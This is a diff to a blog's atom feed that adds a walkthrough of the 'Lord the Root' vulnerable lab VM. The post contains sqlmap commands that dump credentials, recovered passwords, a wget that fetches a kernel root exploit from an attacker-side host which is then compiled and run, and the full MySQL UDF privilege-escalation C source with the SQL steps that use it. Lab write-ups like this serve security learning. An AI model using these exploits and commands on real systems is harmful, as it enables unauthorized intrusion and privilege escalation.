@@ -4,7 +4,7 @@
   <title><![CDATA[Category: mysql | Bob1Bob2]]></title>
   <link href="http://wg135.github.io/blog/categories/mysql/atom.xml" rel="self"/>
   <link href="http://wg135.github.io/"/>
-  <updated>2016-06-09T13:26:19-05:00</updated>
+  <updated>2017-01-25T13:58:13-06:00</updated>
   <id>http://wg135.github.io/</id>
   <author>
     <name><![CDATA[Bob1Bob2]]></name>
@@ -12,6 +12,261 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[Lord the Root]]></title>
+    <link href="http://wg135.github.io/blog/2016/08/12/lord-the-root/"/>
+    <updated>2016-08-12T13:50:04-05:00</updated>
+    <id>http://wg135.github.io/blog/2016/08/12/lord-the-root</id>
+    <content type="html"><![CDATA[<h3>Tools:</h3>
+
+<ul>
+<li>netdiscover</li>
+<li>Nmap</li>
+<li>Wfuzz</li>
+<li>Nikto</li>
+<li>Burpsuite</li>
+<li>Sqlmap</li>
+</ul>
+
+
+<h3>Vulnerabilities:</h3>
+
+<ul>
+<li><a href="https://www.exploit-db.com/exploits/39166/">Linux Kernel 4.3.3 (Ubuntu 14.04/15.10) - &lsquo;overlayfs&rsquo; Local Root Exploit (1)</a></li>
+<li><a href="https://www.exploit-db.com/exploits/1518/">MySQL 4.x/5.0 - User-Defined Function (UDF) Local Privilege Escalation Exploit (Linux)</a></li>
+</ul>
+
+
+<!--more-->
+
+
+<p>Use netdiscover to detect target IP address</p>
+
+<p><code>netdiscover -i eth0 -r 192.168.41.0/24</code>
+<img src="/images/blog/vulhub/lordroot/Selection_001.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>192.168.41.159 is the target.</p>
+
+<p>Then run nmap to detect opening ports and running services on the target machine.</p>
+
+<p><code>nmap -sV -v -O -A -T5 192.168.41.159 -p-</code></p>
+
+<p><img src="/images/blog/vulhub/lordroot/Selection_002.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>Only port 22 is opening.</p>
+
+<p>try to ssh to the box and check the banner</p>
+
+<p><code>ssh root@192.168.41.159</code></p>
+
+<p><img src="/images/blog/vulhub/lordroot/Selection_003.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>find a hint Easy as 1,2,3</p>
+
+<p>looks like port knocking, now try to send packet to port 1, 2 and 3 using <a href="https://github.com/wg135/script/blob/master/port_knocking.py">port knocking</a> script.</p>
+
+<p>run nmap again,</p>
+
+<p><img src="/images/blog/vulhub/lordroot/Selection_005.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>port 1337 is openning and it is running http service.</p>
+
+<p>I used both nikto and wfuzz, nothing interesting come out.</p>
+
+<p>check the page</p>
+
+<p><img src="/images/blog/vulhub/lordroot/Selection_006.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>check the image info,</p>
+
+<p><img src="/images/blog/vulhub/lordroot/Selection_007.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>find an <code>/images/</code>, go to the directory.</p>
+
+<p>nothing cool. check the source code find a <code>/icons/</code>.</p>
+
+<p><img src="/images/blog/vulhub/lordroot/Selection_008.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>check <code>http://192.168.41.159:1337/robots.txt</code></p>
+
+<p><img src="/images/blog/vulhub/lordroot/Selection_009.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>I check <code>THprM09ETTBOVEl4TUM5cGJtUmxlQzV3YUhBPSBDbG9zZXIh</code> and it is base64 encoded.</p>
+
+<p>Decode it in hackbar, I get:</p>
+
+<p><code>Lzk3ODM0NTIxMC9pbmRleC5waHA= Closer!</code></p>
+
+<p>This is also base64 encoded.</p>
+
+<p>Decode it again,</p>
+
+<p><code>/978345210/index.php</code></p>
+
+<p><img src="/images/blog/vulhub/lordroot/Selection_010.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>save the post requst in burpsuit as file post.txt</p>
+
+<p><code>sqlmap -r post.txt -p username --risk=3 --level=5</code></p>
+
+<p><img src="/images/blog/vulhub/lordroot/Selection_011.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>username is vulnerable.</p>
+
+<p>get table name</p>
+
+<p><code>sqlmap -r post.txt -p username --risk=3 --level=5 --dbms=mysql --tables</code></p>
+
+<p>webapp database
+<img src="/images/blog/vulhub/lordroot/Selection_012.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>mysql
+<img src="/images/blog/vulhub/lordroot/Selection_013.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>get columns of webapp</p>
+
+<p><code>sqlmap -r post.txt -p username --risk=3 --level=5 --dbms=mysql -D Webapp -T Users --columns</code></p>
+
+<p><img src="/images/blog/vulhub/lordroot/Selection_014.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>dump username and password</p>
+
+<p><code>sqlmap -r post.txt -p username --risk=3 --level=5 --dbms=mysql -D Webapp -T Users -C username,password --dump</code></p>
+
+<p><img src="/images/blog/vulhub/lordroot/Selection_015.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>get colums of table user</p>
+
+<p><code>sqlmap -r post.txt -p username --risk=3 --level=5 --dbms=mysql -D mysql -T user --columns</code></p>
+
+<p><img src="/images/blog/vulhub/lordroot/Selection_016.png" title="[title manually exploit [alt text]]" ></p>
+
+<p><code>sqlmap -r post.txt -p username --risk=3 --level=5 --dbms=mysql -D mysql -T user -C User,Password --dump</code></p>
+
+<p><img src="/images/blog/vulhub/lordroot/Selection_017.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>try to login web using credential, however, I cannot find anywhere to upload webshell.</p>
+
+<p>I try the credential to login ssh</p>
+
+<p>and <code>smeagol  | MyPreciousR00t</code> works</p>
+
+<h3>Local exploit 1:</h3>
+
+<p><code>uname -a</code></p>
+
+<p>then get:</p>
+
+<p><code>Linux LordOfTheRoot 3.19.0-25-generic #26~14.04.1-Ubuntu SMP Fri Jul 24 21:18:00 UTC 2015 i686 i686 i686 GNU/Linux</code></p>
+
+<p><code>searchsploit Linux Kernel | grep Ubuntu</code></p>
+
+<p><img src="/images/blog/vulhub/lordroot/Selection_019.png" title="[title manually exploit [alt text]]" ></p>
+
+<pre><code>wget http://192.168.41.149/39166.c
+gcc 39166.c -o local
+./local
+</code></pre>
+
+<p>get the root</p>
+
+<p><img src="/images/blog/vulhub/lordroot/Selection_020.png" title="[title manually exploit [alt text]]" ></p>
+
+<h3>Local exploit 2:</h3>
+
+<p><code>ps aux |grep root</code></p>
+
+<p><img src="/images/blog/vulhub/lordroot/Selection_021.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>mysql is running under the root, which is wrong!</p>
+
+<p>login mysql</p>
+
+<p><code>mysql -u root -p</code>, password is <code>darkshadow</code>, and the mysql version is 5.5.44.</p>
+
+<p><img src="/images/blog/vulhub/lordroot/Selection_022.png" title="[title manually exploit [alt text]]" ></p>
+
+<p><code>searchsploit mysql | grep local</code></p>
+
+<p><img src="/images/blog/vulhub/lordroot/Selection_023.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>follow the instruction <code>https://www.exploit-db.com/exploits/1518/</code></p>
+
+<p>use the c code:(1518.c)</p>
+
+<pre><code class="c">
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+enum Item_result {STRING_RESULT, REAL_RESULT, INT_RESULT, ROW_RESULT};
+
+typedef struct st_udf_args {
+    unsigned int        arg_count;  // number of arguments
+    enum Item_result    *arg_type;  // pointer to item_result
+    char            **args;     // pointer to arguments
+    unsigned long       *lengths;   // length of string args
+    char            *maybe_null;    // 1 for maybe_null args
+} UDF_ARGS;
+
+typedef struct st_udf_init {
+    char            maybe_null; // 1 if func can return NULL
+    unsigned int        decimals;   // for real functions
+    unsigned long       max_length; // for string functions
+    char            *ptr;       // free ptr for func data
+    char            const_item; // 0 if result is constant
+} UDF_INIT;
+
+int do_system(UDF_INIT *initid, UDF_ARGS *args, char *is_null, char *error)
+{
+    if (args-&gt;arg_count != 1)
+        return(0);
+
+    system(args-&gt;args[0]);
+
+    return(0);
+}
+
+char do_system_init(UDF_INIT *initid, UDF_ARGS *args, char *message)
+{
+    return(0);
+}
+</code></pre>
+
+<pre><code>gcc -g -c 1518.c
+gcc -g -shared -Wl,-soname,1518.so -o 1518.so 1518.o -lc
+</code></pre>
+
+<p>in mysql</p>
+
+<pre><code>mysql&gt; use mysql
+mysql&gt; create table foo(line blob);
+mysql&gt; insert into foo values(load_file('/tmp/1518.so'));
+mysql&gt; select * from foo into dumpfile '/usr/lib/mysql/plugin/1518.so';
+mysql&gt; create function do_system returns integer soname '1518.so';
+mysql&gt; select * from mysql.func;
+mysql&gt; select do_system('id &gt; /tmp/out; chown smeagol.smeagol /tmp/out');
+mysql&gt; \! sh
+$ cat /tmp/out
+</code></pre>
+
+<p><img src="/images/blog/vulhub/lordroot/Selection_024.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>exploit is good. now use <a href="https://github.com/wg135/script/blob/master/suid.c">suid.c</a></p>
+
+<p>in mysql:</p>
+
+<pre><code>mysql&gt; select do_system('gcc -o /tmp/suid /tmp/suid.c');
+mysql&gt; select do_system('chmod u+s /tmp/suid');
+</code></pre>
+
+<p>in /tmp</p>
+
+<p><code>./suid</code></p>
+
+<p><img src="/images/blog/vulhub/lordroot/Selection_025.png" title="[title manually exploit [alt text]]" ></p>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[Pentesterlab--Xss and MySQL FILE]]></title>
